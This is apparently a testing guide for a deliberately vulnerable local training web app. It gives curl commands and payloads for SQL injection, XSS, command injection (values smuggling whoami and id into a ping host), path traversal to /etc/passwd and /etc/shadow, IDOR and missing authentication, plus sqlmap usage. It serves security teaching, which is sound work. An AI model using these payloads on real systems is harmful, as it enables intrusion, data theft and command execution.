# Vulnerability Testing Guide

This guide provides step-by-step instructions for testing each vulnerability in the application.

## Setup

Start the application:
```bash
npm install
npm start
```

Then visit: http://localhost:3000

---

## 1. SQL Injection Testing

### Method 1: Using the Web Form
1. Navigate to http://localhost:3000
2. Go to "SQL Injection" section
3. Try these payloads:
   - **Username**: `' OR '1'='1' --`
   - **Password**: (leave blank or anything)
   - **Click**: Login

### Method 2: Using curl
```bash
# Basic SQL injection
curl -X POST -d "username=' OR '1'='1' --&password=anything" http://localhost:3000/login

# Extract data
curl -X POST -d "username=' UNION SELECT username, password, email, isAdmin FROM users --&password=x" http://localhost:3000/login

# Admin bypass
curl -X POST -d "username=admin'--&password=x" http://localhost:3000/login
```

### Method 3: Using Burp Suite
1. Open Burp Suite → Proxy → Intercept
2. Submit login form
3. Send to Repeater
4. Modify the POST body with SQL injection payload
5. Send and observe response

**Expected Result**: Bypass authentication and see user information

---

## 2. XSS (Cross-Site Scripting) Testing

### Method 1: Using the Web Form
1. Navigate to http://localhost:3000
2. Go to "XSS" section
3. Try these payloads:
   - `<script>alert('XSS')</script>`
   - `<img src=x onerror=alert('XSS')>`
   - `<svg onload=alert('XSS')>`

### Method 2: Using curl
```bash
# Simple script injection
curl -X POST -d "comment=<script>alert('XSS')</script>" http://localhost:3000/comment

# Image tag injection
curl -X POST -d "comment=<img src=x onerror=alert('XSS')>" http://localhost:3000/comment
```

### Method 3: Stored XSS Simulation
If the form saved comments to database:
1. Submit XSS payload
2. View stored data
3. JavaScript executes when viewing comments

**Expected Result**: JavaScript alert appears in browser; reflected XSS confirmed

---

## 3. IDOR (Insecure Direct Object References) Testing

### Method 1: Direct URL Access
```
http://localhost:3000/user/1  → View admin user
http://localhost:3000/user/2  → View regular user
http://localhost:3000/user/99 → Try accessing non-existent user
```

### Method 2: Using curl
```bash
curl http://localhost:3000/user/1
curl http://localhost:3000/user/2
curl http://localhost:3000/user/100
```

### Method 3: Using Burp Suite
1. Visit `/user/1` normally
2. Intercept the request
3. Change ID parameter: `1` → `2`, `100`, etc.
4. Observe unauthorized data access

**Expected Result**: Access any user's password, email, and other sensitive data

---

## 4. Command Injection Testing

### Method 1: Using Web Form
Visit these URLs in your browser:
```
http://localhost:3000/ping?host=8.8.8.8
http://localhost:3000/ping?host=8.8.8.8; whoami
http://localhost:3000/ping?host=127.0.0.1 | id
```

### Method 2: Using curl
```bash
# Normal ping
curl "http://localhost:3000/ping?host=8.8.8.8"

# Command separator
curl "http://localhost:3000/ping?host=8.8.8.8; whoami"
curl "http://localhost:3000/ping?host=localhost | id"
curl "http://localhost:3000/ping?host=localhost && whoami"

# More dangerous (don't use on real systems!)
curl "http://localhost:3000/ping?host=localhost; uname -a"
```

### Method 3: Using URL Encoding
```bash
# %20 = space, %3B = semicolon
curl "http://localhost:3000/ping?host=8.8.8.8%3Bwhoami"
```

**Expected Result**: Execute arbitrary system commands, see command output

---

## 5. Path Traversal Testing

### Method 1: Using Web Browser
```
http://localhost:3000/download?file=sample.txt
http://localhost:3000/download?file=../app.js
http://localhost:3000/download?file=../package.json
http://localhost:3000/download?file=../../../../etc/passwd
```

### Method 2: Using curl
```bash
# Access legitimate file
curl "http://localhost:3000/download?file=sample.txt"

# Traverse directories
curl "http://localhost:3000/download?file=../app.js" > app.js
curl "http://localhost:3000/download?file=../README.md"

# Access system files (Unix/Linux)
curl "http://localhost:3000/download?file=../../../../etc/passwd"
curl "http://localhost:3000/download?file=../../../../etc/shadow"  # Requires root
```

### Method 3: Using URL Encoding
```bash
# ../ = %2e%2e%2f
curl "http://localhost:3000/download?file=%2e%2e%2fapp.js"
```

**Expected Result**: Download and view any file on the server

---

## 6. Hardcoded Credentials Testing

### Method 1: Direct Access
```
http://localhost:3000/api-key
```

### Method 2: Using curl
```bash
curl http://localhost:3000/api-key
```

### Method 3: Source Code Review
```bash
cat app.js | grep -i "password\|api\|secret\|key"
```

**Expected Result**: Find API keys, database passwords, and other credentials

---

## 7. Missing Authentication Testing

### Method 1: Direct Access
```
http://localhost:3000/admin
```

### Method 2: Submit Admin Form
1. Navigate to `/admin`
2. Modify a user's role without being authenticated
3. Observe changes take effect

### Method 3: Using curl
```bash
# Access admin panel
curl http://localhost:3000/admin

# Execute admin function
curl -X POST -d "user_id=2&new_role=1" http://localhost:3000/admin/update
```

**Expected Result**: Access admin functionality without login credentials

---

## 8. Weak Password Storage Testing

### Method 1: Database Access
```bash
# On Unix/Linux
sqlite3 vulnerable.db

# Then in SQLite:
SELECT * FROM users;
```

### Method 2: View via IDOR
```
http://localhost:3000/user/1  # Shows admin password in plaintext
http://localhost:3000/user/2  # Shows user password in plaintext
```

### Method 3: Source Code Analysis
1. Check how passwords are stored in app.js
2. Observe no hashing function is used

**Expected Result**: See all passwords in plaintext

---

## 9. Information Disclosure Testing

### Web Requests
```
http://localhost:3000/debug
```

### Using curl
```bash
curl http://localhost:3000/debug
```

**Expected Result**: See database name, usernames, passwords, system information

---

## 10. Open Redirect Testing

### Method 1: Using Web Browser
```
http://localhost:3000/redirect?url=https://google.com
http://localhost:3000/redirect?url=https://attacker.com
```

### Method 2: Using curl (follow redirects)
```bash
curl -L "http://localhost:3000/redirect?url=https://google.com"
```

**Expected Result**: Redirected to any arbitrary URL (phishing risk)

---

## Automated Testing with SQLMap

For SQL injection testing:

```bash
# Installation
pip install sqlmap

# Test login endpoint
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username --batch

# More aggressive
sqlmap -u "http://localhost:3000/login" --data="username=test&password=test" -p username --dbs --batch
```

---

## Automated Testing with OWASP ZAP

1. Download OWASP ZAP
2. Start the application
3. Configure ZAP proxy
4. Open http://localhost:3000
5. Run automated scan
6. Review findings

---

## Burp Suite Workflow

1. **Start Burp Suite Community Edition**
2. **Configure Browser Proxy**:
   - Port: 8080
   - Proxy localhost traffic

3. **Target Discovery**:
   - Navigate to http://localhost:3000
   - Intercept requests

4. **Manual Testing**:
   - Modify requests in Repeater
   - Test each vulnerability

5. **Automated Scanning**:
   - Run Crawler
   - Run Active Scanner
   - Review results

6. **Reporting**:
   - Generate report
   - Document findings

---

## Safety Guidelines

⚠️ **Important**:
- Only test on your local machine
- Don't modify critical system files
- Don't run destructive commands without understanding them
- Make copies of important files before testing
- Use this only for learning and authorized testing

---

## Next Steps

After finding vulnerabilities:
1. Understand the root cause
2. Research secure coding practices
3. Implement fixes
4. Test that fixes work
5. Learn from the experience
